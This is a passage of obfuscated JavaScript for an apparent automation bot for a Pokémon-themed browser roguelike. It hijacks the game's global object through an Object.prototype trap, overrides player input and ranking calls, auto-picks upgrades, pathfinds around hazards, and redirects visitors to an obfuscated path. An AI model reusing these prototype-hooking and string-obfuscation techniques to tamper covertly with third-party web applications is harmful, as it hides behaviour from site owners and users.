                    const gap = 1000 / cfg.fps - 3;
                    const step = t => {
                        if (t === allowedT || t - lastT >= gap) {
                            allowedT = t;
                            lastT = t;
                            later.delete(id);
                            mark(t);
                            return cb(t);
                        }
                        later.set(id, nativeRAF.call(window, step));
                    };
                    later.set(id, nativeRAF.call(window, step));
                    return id;
                };
                window.cancelAnimationFrame = function (id) {
                    if (later.has(id)) {
                        nativeCAF.call(window, later.get(id));
                        later.delete(id);
                    }
                    else
                        nativeCAF.call(window, id);
                };
                const CSS = `
    body *:not([data-psbot-ui]):not([data-psbot-ui] *) {
      animation-duration: .001s !important; animation-delay: 0s !important; animation-iteration-count: 1 !important;
      transition-duration: .001s !important; transition-delay: 0s !important;
      backdrop-filter: none !important; -webkit-backdrop-filter: none !important; filter: none !important;
      text-shadow: none !important; box-shadow: none !important; mix-blend-mode: normal !important; will-change: auto !important;
    }`;
                const PIXEL_CSS = _0xstr(0x110);
                const styles = {};
                const toggleStyle = (id, on, text) => {
                    if (on && !styles[id]) {
                        if (!document.head && !document.documentElement)
                            return void document.addEventListener(_0xstr(0x111), applyCss, { once: true });
                        const s = document.createElement(_0xstr(0x112));
                        s.id = id;
                        s.textContent = text;
                        (document.head || document.documentElement).append(s);
                        styles[id] = s;
                    }
                    else if (!on && styles[id]) {
                        styles[id].remove();
                        delete styles[id];
                    }
                };
                const applyCss = () => { toggleStyle(_0xstr(0x113), cfg.css, CSS); toggleStyle(_0xstr(0x114), cfg.pixel, PIXEL_CSS); };
                const same = (a, b) => Object.keys(DEF).every(k => a[k] === b[k]);
                window.PSLite = {
                    live: cfg,
                    get: () => ({ ...cfg }),
                    native: nativeDpr,
                    presets: PRESETS,
                    matchPreset: () => Object.keys(PRESETS).find(n => same(cfg, PRESETS[n])) || '',
                    set(patch) {
                        const dprChanged = _0xstr(0x115) in patch && patch.dpr !== cfg.dpr;
                        for (const k in patch)
                            if (k in DEF && typeof patch[k] === typeof DEF[k])
                                cfg[k] = patch[k];
                        if (cfg.skip <= 1)
                            open = true;
                        save();
                        applyCss();
                        if (dprChanged)
                            try {
                                window.dispatchEvent(new Event(_0xstr(0x116)));
                            }
                            catch { }
                    },
                    preset(name) { if (PRESETS[name])
                        this.set({ ...PRESETS[name] }); },
                };
                applyCss();
            })();
        },
        "sites/default/hook.js": () => {
            (() => {
                if (window.G || Object.getOwnPropertyDescriptor(Object.prototype, _0xstr(0x117)))
                    return;
                const trap = {
                    configurable: true,
                    get() { return undefined; },
                    set(v) {
                        Object.defineProperty(this, _0xstr(0x118), { value: v, writable: true, enumerable: true, configurable: true });
                        if (this && this.BUILT === true && _0xstr(0x119) in this) {
                            drop();
                            window.G = this;
                        }
                    },
                };
                const drop = () => { if (Object.getOwnPropertyDescriptor(Object.prototype, _0xstr(0x11a))?.set === trap.set)
                    delete Object.prototype.Game; };
                Object.defineProperty(Object.prototype, _0xstr(0x11b), trap);
                addEventListener(_0xstr(0x11c), () => { if (!window.G)
                    drop(); }, { once: true });
            })();
        },
        "sites/default/site.js": () => {
            (() => {
                let keep = false;
                try {
                    keep = localStorage.getItem(_0xstr(0x11d)) === _0xstr(0x11e);
                }
                catch { }
                if (!keep && location.pathname === _0xstr(0x11f) && !/^(localhost|127\.0\.0\.1)$/.test(location.hostname))
                    location.replace(_0xstr(0x120) + location.search + location.hash);
            })();
            (() => {
                let tries = 0;
                const t = setInterval(() => {
                    const R = window.G && window.G.Ranking;
                    if (!R && ++tries < 60)
                        return;
                    clearInterval(t);
                    if (R)
                        for (const k of [_0xstr(0x121), _0xstr(0x122)]) {
                            const orig = R[k];
                            if (typeof orig !== _0xstr(0x123) || orig.psbot)
                                continue;
                            R[k] = Object.assign(function () {
                                const bot = window.PSBot;
                                if (bot && bot.state.on && bot.SITE.noRank && bot.SITE.noRank.get()) {
                                    console.log(_0xstr(0x124), _0xstr(0x125), _0xstr(0x126));
                                    return Promise.resolve(null);
                                }
                                return orig.apply(this, arguments);
                            }, { psbot: true });
                        }
                }, 1000);
            })();
            window.PSBotList = window.PSBotList || (list => {
                const l = typeof list === _0xstr(0x127) ? document.querySelectorAll(list) : list, a = [];
                for (let i = 0; i < l.length; i++)
                    a.push(l[i]);
                return a;
            });
            window.PSBotSite = h => {
                const cardOf = k => {
                    let card = k;
                    while (card.parentElement && card.parentElement.querySelectorAll(_0xstr(0x128)).length === 1)
                        card = card.parentElement;
                    return card;
                };
                function cardRow(lvl) {
                    for (let box = lvl.parentElement; box && box !== document.body; box = box.parentElement) {
                        const groups = new Map();
                        for (const e of PSBotList(box.querySelectorAll(_0xstr(0x129)))) {
                            if (e.contains(lvl) || !h.visible(e) || e.querySelector(_0xstr(0x12a)) || /reroll|skip|banish/i.test(e.innerText))
                                continue;
                            const r = e.getBoundingClientRect();
                            if (r.width < 60 || r.height < 40 || !e.innerText.trim())
                                continue;
                            groups.set(e.parentElement, [...(groups.get(e.parentElement) || []), e]);
                        }
                        const best = [...groups.values()].map(g => g.filter(e => e.tagName === g[0].tagName && e.className === g[0].className))
                            .filter(g => g.length >= 2 && g.length <= 6).sort((a, b) => b.length - a.length)[0];
                        if (best)
                            return best;
                    }
                    return [];
                }
                function readCard(card, key, k, el) {
                    const { state, CFG, fontSize } = h;
                    const t = card.innerText;
                    const own = e => PSBotList(e.childNodes).filter(n => n.nodeType === 3).map(n => n.textContent).join('').trim();
                    const leaves = PSBotList(card.querySelectorAll(_0xstr(0x12b))).filter(e => e !== k && /\D/.test(own(e)));
                    const title = leaves.reduce((b, e) => (!b || fontSize(e) > fontSize(b) ? e : b), null);
                    const name = title ? own(title) : '';
                    const shownLv = t.match(/\b(?:Lv|Nv|Niv)\.?\s*(\d+)/i);
                    return { ...h.scoreCard({
                            key, name, t,
                            level: Math.max((state.picks[name] || 0) + (state.hudTexts.has(name) ? 1 : 0), shownLv ? +shownLv[1] - 1 : 0),
                            isNew: /\bNew\b|Nuevo|Novo|Mới/i.test(t),
                            evo: CFG.evoRe.test(t) || /evo|awaken|ultimate/i.test(card.className + _0xstr(0x12c) + PSBotList(card.querySelectorAll(_0xstr(0x12d))).map(e => e.className).join(_0xstr(0x12e))),
                            fitLow: !!card.querySelector(_0xstr(0x12f)), fitHigh: !!card.querySelector(_0xstr(0x130)),
                        }), el };
                }
                const GOOD = new Set([_0xstr(0x131), _0xstr(0x132), _0xstr(0x133), _0xstr(0x134), _0xstr(0x135), _0xstr(0x136), _0xstr(0x137), _0xstr(0x138)]);
                const circle = (x, y, r) => Array.from({ length: 12 }, (_, i) => ({ x: x + r * Math.cos(i * Math.PI / 6), y: y + r * Math.sin(i * Math.PI / 6) }));
                let tiles = null;
                function terrainNear(px, py) {
                    const W = G.World, TS = W.TS, R = 40, tx = Math.floor(px / TS), ty = Math.floor(py / TS), now = performance.now();
                    if (tiles && tiles.key === `${tx},${ty}` && now - tiles.at < 1000)
                        return tiles.list;
                    const deadly = !!W.liquidEffect([]).dmg, list = [];
                    for (let j = ty - R; j <= ty + R; j++)
                        for (let i = tx - R; i <= tx + R; i++) {
                            const x = i * TS + TS / 2, y = j * TS + TS / 2;
                            const kind = W.isWall(x, y) ? 1 : W.isLiquid(x, y) ? (deadly ? 1 : 2) : 0;
                            if (kind)
                                list.push({ x: i * TS, y: j * TS, kind });
                        }
                    tiles = { key: `${tx},${ty}`, at: now, list };
                    return list;
                }
                function scene(cam) {
                    const G = window.G, P = G && G.Game && G.Game.player;
                    if (!P || !G.World || !/playing|levelup|choice/.test(G.Game.state))
                        return null;
                    const { s, e, f } = cam;
                    const X = x => x * s + e, Y = y => y * s + f;
                    const near = (o, r) => Math.abs(o.x - P.x) < r && Math.abs(o.y - P.y) < r;
                    const box = (o, size, src) => ({ src, x: X(o.x), y: Y(o.y), w: size * s, h: size * s, s, e, f });
                    h.state.selfDex = String(P.dex);
                    h.state.magnet = P.magnet;
                    const out = { me: { x: X(P.x), y: Y(P.y) }, enemies: [], hazard: [], xp: [], good: [], case: [], buff: [], heal: [], rift: [], wall: [], break: [], prize: [] };
                    for (const o of G.EnemyMgr.all()) {
                        if (o.dead || !near(o, 1400))
                            continue;
                        if (o.behavior === _0xstr(0x139)) {
                            out.prize.push(box(o, 2 * o.r + 16, _0xstr(0x13a)));
                            continue;
                        }
                        const k = G.Types.mult(o.atkType, P.mon.types);
                        out.enemies.push(box(o, 2 * o.r + 16 + 24 * Math.max(0, Math.min(2, k - 1)), `G:enemy:${o.dex}`));
                        if (o.shiny)
                            out.prize.push({ ...box(o, 2 * o.r + 16, _0xstr(0x13b)), engage: true });
                    }
                    for (const z of G.Hazards.all) {
                        let pts;
                        if (z.kind === _0xstr(0x13c))
                            pts = circle(z.x, z.y, z.r);
                        else {
                            const c = Math.cos(z.angle), n = Math.sin(z.angle), hw = z.w / 2, x1 = z.x + c * z.len, y1 = z.y + n * z.len;
                            pts = [[z.x - n * hw, z.y + c * hw], [x1 - n * hw, y1 + c * hw], [x1 + n * hw, y1 - c * hw], [z.x + n * hw, z.y - c * hw]].map(([x, y]) => ({ x, y }));
                        }
                        out.hazard.push({ src: `G:hazard:${z.kind}`, shape: _0xstr(0x13d), lw: 0, pts: pts.map(p => ({ x: X(p.x), y: Y(p.y) })), x: X(z.x), y: Y(z.y), w: 0, h: 0 });
                    }
                    const ahead = h.CFG.shotLookahead / 1000;
                    for (const p of G.Projectiles.all()) {
                        if (p.friendly !== false || !near(p, 1400))
                            continue;
                        out.hazard.push({ src: _0xstr(0x13e), shape: _0xstr(0x13f), lw: 2 * (p.r + P.r) * s, x: X(p.x), y: Y(p.y), w: 0, h: 0,
                            pts: [{ x: X(p.x), y: Y(p.y) }, { x: X(p.x + p.vx * ahead), y: Y(p.y + p.vy * ahead) }] });
                    }
                    for (const p of G.Pickups.all()) {
                        if (!G.Camera.sees(p.x, p.y, 60))
                            continue;
                        if (p.kind === _0xstr(0x140) || p.kind === _0xstr(0x141))
                            out.xp.push(box(p, 12, `G:${p.kind}`));
                        else if (GOOD.has(p.kind))
                            out.good.push(box(p, 14, `G:${p.kind}`));
                    }
                    const props = new Set(G.World.visibleProps(G.Camera));
                    for (const p of G.World.specialsNear(P.x, P.y, 1200))
                        if (p.type === _0xstr(0x142))
                            props.add(p);
                    for (const p of props) {
                        const d = box(p, 2.5 * p.r, `G:${p.type}`);
                        if (p.type === _0xstr(0x143) || ((p.type === _0xstr(0x144) || p.type === _0xstr(0x145)) && p.hp > 0))
                            out.wall.push(d);
                        else if (p.type === _0xstr(0x146) && p.hp > 0)
                            out.case.push(d);
                        else if (p.type === _0xstr(0x147) && !p.used)
                            out.buff.push(d);
                        else if (p.type === _0xstr(0x148) && p.charge > 0.1)
                            out.heal.push({ ...d, y: Y(p.y - 8) });
                        else if (p.type === _0xstr(0x149) && p.hp > 0)
                            out.hazard.push({ ...d, y: Y(p.y - 8), w: 26 * s, h: 26 * s });
                    }
                    const rift = G.Rift.rift;
                    if (rift && !G.Rift.inArena && near(rift, 2500))
                        out.rift.push(box({ x: rift.x, y: rift.y - 10 }, 40, _0xstr(0x14a)));
                    const TS = G.World.TS;
                    out.terrain = terrainNear(P.x, P.y).map(t => ({ x: X(t.x), y: Y(t.y), w: TS * s, kind: t.kind }));
                    return out;
                }
                const rgb = h => [1, 3, 5].map(i => parseInt(h.slice(i, i + 2), 16));
                const shade = (c, t) => c.map(e => Math.round(t >= 0 ? e + (255 - e) * t : e * (1 + t)));
                const blend = (a, b, t) => a.map((e, i) => Math.round(e + (b[i] - e) * t));
                const ckey = c => (c[0] << 16) | (c[1] << 8) | c[2];
                const DEADLY = new Set([_0xstr(0x14b), _0xstr(0x14c), _0xstr(0x14d)]);
                const BIOMES = [
                    [_0xstr(0x14e), _0xstr(0x14f), _0xstr(0x150), _0xstr(0x151)],
                    [_0xstr(0x152), _0xstr(0x153), _0xstr(0x154), _0xstr(0x155)],
                    [_0xstr(0x156), _0xstr(0x157), _0xstr(0x158), _0xstr(0x159)],
                    [_0xstr(0x15a), _0xstr(0x15b), _0xstr(0x15c), _0xstr(0x15d)],
                    [_0xstr(0x15e), _0xstr(0x15f), _0xstr(0x160), _0xstr(0x161)],
                    [_0xstr(0x162), _0xstr(0x163), _0xstr(0x164), _0xstr(0x165)],
                ].map(([floor, wall, liq, liquid]) => ({ floor: floor.split(_0xstr(0x166)).map(rgb), wall: wall.split(_0xstr(0x167)).map(rgb), liq: liq.split(_0xstr(0x168)).map(rgb), liquid }));
                for (const a of (_0xstr(0x169) + _0xstr(0x16a) + _0xstr(0x16b) + _0xstr(0x16c) + _0xstr(0x16d) + _0xstr(0x16e) + _0xstr(0x16f)).split(_0xstr(0x170))) {
                    const [f, w, l, foam, liquid] = a.split(_0xstr(0x171)), F = rgb(f), W = rgb(w), L = rgb(l);
                    BIOMES.push({ floor: [F, shade(F, 0.05), shade(F, -0.06), shade(F, -0.16), shade(F, -0.12), shade(F, -0.2)],
                        wall: [W, shade(W, 0.07), shade(W, -0.07), shade(W, 0.32), shade(W, -0.7), shade(W, -0.3), shade(W, -0.38), shade(W, -0.55)],
                        liq: [L, shade(L, -0.22), foam === _0xstr(0x172) ? shade(L, 0.55) : rgb(foam)], liquid });
                }
                const palettes = BIOMES.map(b => ({ floor: new Set(b.floor.map(ckey)), wall: new Set(b.wall.map(ckey)),
                    liquid: new Set([...b.liq, blend(b.liq[0], b.liq[2], 0.28)].map(ckey)), deadly: DEADLY.has(b.liquid) }));
                const terrainCache = new WeakMap();
                function classify(img) {
                    let px;
                    try {
                        px = img.getContext(_0xstr(0x173)).getImageData(0, 0, 256, 256).data;
                    }
                    catch {
                        return null;
                    }
                    const at = (x, y) => { const o = (y * 256 + x) * 4; return (px[o] << 16) | (px[o + 1] << 8) | px[o + 2]; };
                    let best = null, bestHits = 0;
                    for (const p of palettes) {
                        let hits = 0;
                        for (let y = 1; y < 256; y += 4)
                            for (let x = 1; x < 256; x += 4) {
                                const k = at(x, y);
                                if (p.floor.has(k) || p.wall.has(k) || p.liquid.has(k))
                                    hits++;
                            }
                        if (hits > bestHits) {
                            best = p;
                            bestHits = hits;
                        }
                    }
                    if (!best || bestHits < 4096 * 0.3)
                        return null;
                    const tiles = new Uint8Array(256);
                    for (let t = 0; t < 256; t++) {
                        const tx = (t % 16) * 16, ty = Math.floor(t / 16) * 16;
                        let wall = 0, liquid = 0;
                        for (let y = 0; y < 16; y++)
                            for (let x = 0; x < 16; x++) {
                                const k = at(tx + x, ty + y);
                                if (best.wall.has(k))
                                    wall++;
                                else if (best.liquid.has(k))
                                    liquid++;
                            }
                        tiles[t] = wall > 128 ? 1 : liquid > 128 ? (best.deadly ? 1 : 2) : 0;
                    }
                    return tiles;
                }
                function terrain(d) {
                    const img = d.img;
                    if (d.rect || !img || img.width !== 256 || img.height !== 256 || !img.getContext)
                        return null;
                    if (!terrainCache.has(img))
                        terrainCache.set(img, classify(img));
                    return terrainCache.get(img);
                }
                const gameCanvas = () => document.getElementById(_0xstr(0x174)) || PSBotList(document.querySelectorAll(_0xstr(0x175)))
                    .filter(c => (c.width * c.height >= 200000 || c.clientWidth * c.clientHeight >= 100000) && c.getClientRects().length).sort((a, b) => b.width * b.height - a.width * a.height)[0] || null;
                const pilot = window.PSBotPilot ? window.PSBotPilot(h) : null;
                const dexEntry = name => {
                    const g = window.G, shown = d => (g.T ? g.T(d.name) : d.name).toLowerCase();
                    return (g && g.DEX && (g.DEX.find(d => d.name.toLowerCase() === name) || g.DEX.find(d => shown(d) === name))) || null;
                };
                function gameTable({ base = false, desc = false } = {}) {
                    const g = window.G, M = g && g.Moves;
                    if (!M || !M.BY_ID || !M.poolFor || !g.DEX || !g.TM_OF)
                        return null;
                    const T = (s, ctx) => (g.T && s ? g.T(s, ctx) : s);
                    const ids = Object.keys(M.BY_ID), at = Object.fromEntries(ids.map((id, i) => [id, i]));
                    const moves = ids.map(id => {
                        const m = M.BY_ID[id], evo = M.EVO && M.NEED_NAME && M.NEED_NAME[M.EVO[id]];
                        return { id, name: T(m.name, _0xstr(0x176)), type: m.type, kind: m.kind, cat: m.kind === _0xstr(0x177) ? _0xstr(0x178) : m.cat || _0xstr(0x179),
                            dmg: m.dmg, cd: m.cd, stat: m.stat, ...(desc && { desc: T(m.desc) }), ...(evo && { evo: T(evo) }) };
                    });
                    const t = { moves, mons: {}, tm: {}, dex: {} };
                    for (const mon of g.DEX) {
                        const n = T(mon.name).toLowerCase(), start = base ? g.baseStartOf(mon.dex) : g.startMoveOf(mon.dex);
                        const pool = [...new Set([start, ...M.poolFor(mon, true)])].filter(id => id in at);
                        t.dex[n] ??= mon.dex;
                        t.mons[n] = pool.map(id => at[id]);
                        const tm = g.TM_OF(mon.dex).filter(id => id in at && !pool.includes(id)).map(id => at[id]);
                        if (tm.length)
                            t.tm[n] = tm;
                    }
                    return t;
                }
                const TABLE_KEY = _0xstr(0x17a);
                const moveTable = (() => {
                    const t = gameTable();
                    try {
                        if (t)
                            localStorage.setItem(TABLE_KEY, JSON.stringify({ at: Date.now(), table: t }));
                        else
                            return JSON.parse(localStorage.getItem(TABLE_KEY)).table;
                    }
                    catch { }
                    return t;
                })();
                function dealtCards() {
                    const g = window.G, offer = window.__psbotOffer, p = g && g.Game && g.Game.player;
                    if (!p || !g.RunUI || !g.RunUI.pick || !g.UI || !g.UI.isOpen(_0xstr(0x17b)) || !offer || !offer.length)
                        return null;
                    if (performance.now() - (window.__psbotOfferAt || 0) < 700)
                        return { cards: [], rerolls: 0 };
                    const rr = document.getElementById(_0xstr(0x17c));
                    const rerolls = rr && !rr.classList.contains(_0xstr(0x17d)) ? +(document.getElementById(_0xstr(0x17e)) || {}).textContent || 0 : 0;
                    return {
                        cards: offer.map((c, i) => {
                            const id = String(c.key).split(_0xstr(0x17f)).slice(1).join(_0xstr(0x180)), m = p.moves.find(x => x.id === id);
                            const name = String(c.title || '').split(_0xstr(0x181))[0];
                            return { ...h.scoreCard({
                                    key: String(i + 1), name, t: `${c.title || ''} ${c.tag || ''} ${c.desc || ''}`,
                                    level: c.type === _0xstr(0x182) ? 0 : m ? m.lvl || 1 : 0, isNew: c.type === _0xstr(0x183),
                                    evo: c.type === _0xstr(0x184), fitLow: false, fitHigh: false,
                                    type: c.type, stat: c.type === _0xstr(0x185) ? id : undefined, maxLvl: m && m.def && m.def.maxLvl, evolved: !!(m && m.evolved),
                                    armorFull: (p.dmgReduce || 0) >= 0.69,
                                    auto: c.type === _0xstr(0x186) && g.Moves && g.Moves.BY_ID[id] ? (d => ({ kind: d.kind, cat: d.cat, stat: d.stat,
                                        fit: d.cat && g.Stats ? g.Stats.fit(p.mon, d.cat) : 1, side: g.Stats ? g.Stats.sideOf(p.mon) : null,
                                        dmgOwned: p.moves.filter(x => x.kind !== _0xstr(0x187)).length }))(g.Moves.BY_ID[id]) : undefined,
                                }), pick: () => g.RunUI.pick(i) };
                        }),
                        rerolls, reroll: () => g.RunUI.reroll(),
                    };
                }
                return {
                    id: _0xstr(0x188), label: _0xstr(0x189),
                    ready: () => !!gameCanvas(),
                    canvas: gameCanvas,
                    isWorld: d => d.s !== 1,
                    camera: world => world[0],
                    enemyRe: /\/assets\/pokemon\/\d+\/(?!Faint)\w+\.png/,
                    tags: { 'dash:4,4/2': _0xstr(0x18a), 'dash:6,4/2': _0xstr(0x18b), 'fill:rgba(255,60,80,0.35)': _0xstr(0x18c),
                        'canvas:14x14': _0xstr(0x18d), 'canvas:12x12': _0xstr(0x18e), 'canvas:34x16': _0xstr(0x18f),
                        'canvas:30x40': _0xstr(0x190), 'canvas:26x40': _0xstr(0x191), 'canvas:28x40': _0xstr(0x192), 'canvas:22x17': _0xstr(0x193), 'canvas:22x20': _0xstr(0x194) },
                    sizeTags: true,
                    propFoot: { up: 2, r: 13 },
                    bossAura: src => /^fill:#(ffd95e|ff4a4a)$/i.test(src),
                    hazardShape: d => d.src === _0xstr(0x195) && d.pts && d.h > 0
                        ? { ...d, h: d.w, pts: d.pts.map(p => ({ x: p.x, y: d.y + (p.y - d.y) * d.w / d.h })) } : null,
                    scene,
                    terrain,
                    moveSlots: () => { const P = window.G && G.Game && G.Game.player; return P && P.slots ? { used: P.slots.length, max: P.maxMoves } : null; },
                    pilot,
                    monSide(name) {
                        const mon = dexEntry(name);
                        return mon && mon.pa != null && mon.sa != null && mon.pa !== mon.sa ? (mon.sa > mon.pa ? _0xstr(0x196) : _0xstr(0x197)) : null;
                    },
                    moveTable: moveTable || undefined,
                    evolveNeeds: moveTable ? new Map(moveTable.moves.filter(m => m.evo).map(m => [m.name.toLowerCase(), m.evo])) : undefined,
                    gameTable,
                    learnset(name) {
                        const g = window.G, mon = dexEntry(name);
                        if (!mon || !g.Moves || !g.Moves.poolFor || !g.Moves.BY_ID)
                            return null;
                        const move = id => {
                            const m = g.Moves.BY_ID[id];
                            return m && { id, name: g.T ? g.T(m.name, _0xstr(0x198)) : m.name, kind: m.kind, cat: m.kind === _0xstr(0x199) ? _0xstr(0x19a) : m.cat, dmg: m.dmg, cd: m.cd, stat: m.stat };
                        };
                        const list = ids => ids.map(move).filter(Boolean);
                        const start = g.startMoveOf ? g.startMoveOf(mon.dex) : g.Moves.startFor(mon);
                        const natural = list([...new Set([start, ...g.Moves.poolFor(mon, true)])]);
                        if (!natural.length)
                            return null;
                        const M = g.Mons;
                        return { natural, taught: M && M.taught ? list(M.taught(mon.dex)) : [], tms: M && M.learnable ? list(M.learnable(mon.dex)) : [] };
                    },
                    partnerName() {
                        const g = window.G, sv = g && g.DB && g.DB.save, mon = sv && g.DEX_BY && g.DEX_BY[sv.partner];
                        return mon ? (g.T ? g.T(mon.name) : mon.name).toLowerCase() : '';
                    },
                    cardFacts(c, i) {
                        const g = pilot && pilot.card(i);
                        return g && { evoNow: g.evoNow };
                    },
                    noRank: window.G ? {
                        get: () => { try {
                            return localStorage.getItem(_0xstr(0x19b)) !== _0xstr(0x19c);
                        }
                        catch {
                            return true;
                        } },
                        set: on => { try {
                            localStorage.setItem(_0xstr(0x19d), on ? _0xstr(0x19e) : _0xstr(0x19f));
                        }
                        catch { } },
                    } : null,
                    cfg: { caseReach: 40, autoTelegraph: false },
                    levelUp() {
                        const dealt = dealtCards();
                        if (dealt)
                            return dealt;
                        const lvl = document.getElementById(_0xstr(0x1a0));
                        if (!h.visible(lvl))
                            return null;
                        const rerolls = +(document.getElementById(_0xstr(0x1a1)) || {}).innerText || 0;
                        const shown = PSBotList(document.querySelectorAll(_0xstr(0x1a2))).filter(h.visible);
                        if (shown.length)
                            return { cards: shown.map(k => readCard(cardOf(k), k.innerText.trim(), k, null)), rerolls };
                        let box = lvl;
                        while (box.parentElement && box !== document.body && !box.querySelector(_0xstr(0x1a3)))
                            box = box.parentElement;
                        const hidden = box === document.body ? [] : PSBotList(box.querySelectorAll(_0xstr(0x1a4))).map(k => ({ k, card: cardOf(k) })).filter(o => h.visible(o.card));
                        const list = hidden.length ? hidden : cardRow(lvl).map(card => ({ k: null, card }));
                        return { cards: list.map(({ k, card }, i) => readCard(card, k ? k.textContent.trim() || String(i + 1) : String(i + 1), k, card)), rerolls };
                    },
                    choiceOpen: () => h.visible(document.getElementById(_0xstr(0x1a5))),
                    otherChoice() { },
                    menu: buttons => buttons.some(b => /^(play|jugar)/i.test((b.innerText || '').trim()) && /dungeon|mazmorra/i.test(b.innerText)),
                    saveGame() {
                        const b = document.getElementById(_0xstr(0x1a6));
                        if (!b || b.classList.contains(_0xstr(0x1a7)) || !h.visible(b))
                            return null;
                        const dot = document.querySelector(_0xstr(0x1a8)), st = dot ? [...dot.classList].find(c => c !== _0xstr(0x1a9)) : '';
                        return { el: b, done: st === _0xstr(0x1aa) || st === _0xstr(0x1ab) || st === _0xstr(0x1ac), busy: b.disabled || st === _0xstr(0x1ad) };
                    },
                    restartButton(buttons) {
                        for (const re of h.CFG.restartSteps) {
                            const b = buttons.find(b => { const x = (b.innerText || '').trim(); return re.test(x) && !h.CFG.restartAvoid.test(x); });
                            if (b)
                                return b;
                        }
                    },
                };
            };
        },
        "sites/default/pilot.js": () => {
            window.PSBotPilot = h => {
                const log = (...a) => console.log(_0xstr(0x1ae), _0xstr(0x1af), ...a);
                const now = () => performance.now();
                const G = () => window.G;
                const S = { lastT: now(), stuckT: 0, unstickT: 0, unstickDir: null, wanderA: Math.random() * 6.28, lastSlotCheck: 0, lastOrb: 0,
                    pausedAt: 0, plan: null, seen: {}, ban: {}, noGo: {}, jCenter: null, holding: false, holdKey: null, holdSince: 0, wd: null,
                    losBadT: 0, spin: 1, spinBlockT: 0, loopC: null, dirIdx: -1, holdT: 0, out: [1, 0], orbGoal: null, lastPos: null, mode: '' };
                const playing = () => { const g = G(); return !!(g && g.Game && g.Game.player && g.Input && g.Game.state === _0xstr(0x1b0)); };
                const active = () => !!(h.state && h.state.on && !h.state.dead && playing());
                function install() {
                    const g = G();
                    if (!g || !g.Input || !g.LevelUp)
                        return;
                    if (!g.Input.axis.psbot) {
                        const orig = g.Input.axis.bind(g.Input);
                        g.Input.axis = Object.assign(function () {
                            const manual = orig();
                            if (manual && (manual[0] || manual[1]))
                                return manual;
                            const p = window.PSBot && window.PSBot.SITE.pilot;
                            if (!p || !p.active())
                                return manual;
                            try {
                                return p.steer();
                            }
                            catch (e) {
                                console.warn(_0xstr(0x1b1), e);
                                return manual;
                            }
                        }, { psbot: true });
                    }
                    if (!g.LevelUp.offer.psbot) {
                        const orig = g.LevelUp.offer;
                        g.LevelUp.offer = Object.assign(function () { window.__psbotOfferAt = now(); return (window.__psbotOffer = orig.apply(this, arguments)); }, { psbot: true });
                    }
                    const R = g.RunUI;
                    if (R && R.showBond && !R.showBond.psbot) {
                        const later = (name, fn) => {
                            const orig = R[name];
                            R[name] = Object.assign(function (...a) {
                                const r = orig.apply(this, a);
                                const p = window.PSBot && window.PSBot.SITE.pilot;
                                if (p && p.on())
                                    setTimeout(() => { try {
                                        p[fn](...a);
                                    }
                                    catch (e) {
                                        console.warn(_0xstr(0x1b2), fn, e);
                                    } }, 700);
                                return r;
                            }, { psbot: true });
                        };
                        later(_0xstr(0x1b3), _0xstr(0x1b4));
                        later(_0xstr(0x1b5), _0xstr(0x1b6));
                    }
                }
                const on = () => !!(h.state && h.state.on && !h.state.dead && h.CFG.autoPick);
                const idOf = name => name.toLowerCase().replace(/[^a-z0-9]+/g, _0xstr(0x1b7)).replace(/^-|-$/g, '');
                function bond(opt) {
                    const g = G();
                    if (!g.UI.isOpen(_0xstr(0x1b8)))
                        return;
                    const build = ((h.currentBuild && h.currentBuild()) || []).map(n => n.toLowerCase()), ids = build.map(idOf);
                    const shown = m => { const d = g.Moves && g.Moves.BY_ID && g.Moves.BY_ID[m.id]; return d ? (g.T ? g.T(d.name, _0xstr(0x1b9)) : d.name).toLowerCase() : ''; };
                    const rank = m => {
                        const i = Math.max(build.indexOf(shown(m)), ids.indexOf(m.id));
                        return (i >= 0 ? i : 50 + (m.kind === _0xstr(0x1ba) ? 10 : 0)) - (m.lvl || 0) / 100;
                    };
                    const order = opt.loose.map((m, i) => ({ m, i })).sort((a, b) => rank(a.m) - rank(b.m));
                    if (!order.length)
                        return;
                    if (opt.mode === _0xstr(0x1bb) || order.length < 2) {
                        log(_0xstr(0x1bc), order[0].m.id);
                        return g.RunUI.pickBond(order[0].i);
                    }
                    const first = order[0].m, second = order[1].m;
                    log(_0xstr(0x1bd), first.id, _0xstr(0x1be), second.id);
                    g.RunUI.pickBond(order[0].i);
                    setTimeout(() => g.RunUI.pickBond(opt.loose.filter(m => m !== first).indexOf(second)), 250);
                }
                function item(cur, next) {
                    const flat = s => s.replace(/[^a-z0-9]/gi, '').toLowerCase();
                    const score = id => {
                        if ((h.CFG.swapAwayItems || []).some(n => flat(n) === id))
                            return -1;
                        const k = Object.keys(h.CFG.itemScores || {}).find(n => flat(n) === id);
                        return k ? h.CFG.itemScores[k] : 2;
                    };
                    const keep = score(cur) >= score(next);
                    log(_0xstr(0x1bf), keep ? `giữ ${cur}` : `đổi sang ${next}`);
                    const el = document.querySelectorAll(_0xstr(0x1c0))[keep ? 0 : 1];
                    if (el)
                        el.click();
                }
                const isOpen = id => { const e = document.getElementById(id); return !!e && !e.classList.contains(_0xstr(0x1c1)); };
                const runOver = () => isOpen(_0xstr(0x1c2));
                const menuOpen = () => isOpen(_0xstr(0x1c3));
                function restartButton() {
                    for (const [scr, btn] of [[_0xstr(0x1c4), _0xstr(0x1c5)], [_0xstr(0x1c6), _0xstr(0x1c7)], [_0xstr(0x1c8), _0xstr(0x1c9)], [_0xstr(0x1ca), _0xstr(0x1cb)], [_0xstr(0x1cc), _0xstr(0x1cd)]]) {
                        if (isOpen(scr))
                            return document.getElementById(btn);
                    }
                    if (runOver())
                        return document.getElementById(_0xstr(0x1ce));
                    if (menuOpen())
                        return document.querySelector(_0xstr(0x1cf));
                    return null;
                }
                const hazards = () => (G().Hazards && G().Hazards.all) || [];
                function inHazard(z, x, y, r) {
                    if (z.kind === _0xstr(0x1d0))
                        return (x - z.x) ** 2 + (y - z.y) ** 2 < (z.r + r) ** 2;
                    const c = Math.cos(z.angle || 0), s = Math.sin(z.angle || 0), dx = x - z.x, dy = y - z.y, along = dx * c + dy * s;
                    return along > -r && along < (z.len || 0) + r && Math.abs(-dx * s + dy * c) <= (z.w || 0) / 2 + r;
                }
                const trapsNear = (W, x, y, r) => ((W && W.specialsNear && W.specialsNear(x, y, r)) || []).filter(t => t.type === _0xstr(0x1d1));
                function findPath(p, tx, ty, goalTol) {
                    const W = G().World, TS = W.TS || 32;
                    if (!W.isFree)
                        return null;
                    const sx = Math.floor(p.x / TS), sy = Math.floor(p.y / TS), gx = Math.floor(tx / TS), gy = Math.floor(ty / TS);
                    const span = Math.max(Math.abs(gx - sx), Math.abs(gy - sy)) + 20;
